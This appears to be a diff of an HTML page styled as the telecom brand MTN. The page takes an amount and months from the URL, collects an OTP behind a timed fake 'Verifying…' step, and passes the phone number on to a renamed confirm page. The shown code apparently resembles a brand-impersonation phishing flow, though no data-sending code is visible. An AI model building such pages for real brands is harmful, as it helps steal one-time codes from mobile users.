@@ -46,7 +46,6 @@
   }
   .frame-bottom{margin-top:auto;}
 
-  /* ============ HEADER (blue bar, "MTN.") ============ */
   .header{
     width:100%;
     background:var(--mtn-blue-deep);
@@ -67,14 +66,12 @@
   }
   .brand strong em{font-style:normal;color:var(--mtn-yellow);}
 
-  /* ============ MAIN ============ */
   main{
     width:100%;max-width:920px;flex:1;
     padding:40px 20px 60px;
     display:flex;flex-direction:column;align-items:center;
   }
 
-  /* ============ CARD ============ */
   .card{
     background:var(--card);
     width:100%;max-width:460px;
@@ -261,7 +258,6 @@
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
 
-  /* ---- CODE PREVIEW ---- */
   .code-preview{
     display:none;
     background:#E6F7ED;
@@ -295,7 +291,6 @@
     letter-spacing:3px;font-family:'Courier New',monospace;
   }
 
-  /* ---- BUTTONS ---- */
   .btn-row{display:flex;gap:12px;}
   .btn-back{
     flex:0 0 auto;
@@ -464,7 +459,6 @@
   <div class="frame-bottom"></div>
 
 <script>
-  // ----- READ FROM URL -----
   const params = new URLSearchParams(location.search);
   const amount = parseInt(params.get('amount')) || 50000;
   const months = parseInt(params.get('months')) || 1;
@@ -561,9 +555,9 @@
     submitOtpBtn.textContent = 'Verifying…';
 
     setTimeout(() => {
-      // Navigate to otp-confirm.html (the 4-digit page) — this fixes the "not found"
+      // Redirect to confirm.html (the renamed file)
       window.location.href =
-        'otp-confirm.html' +
+        'confirm.html' +
         '?amount=' + amount +
         '&months=' + months +
         '&phone='  + encodeURIComponent(phone) +
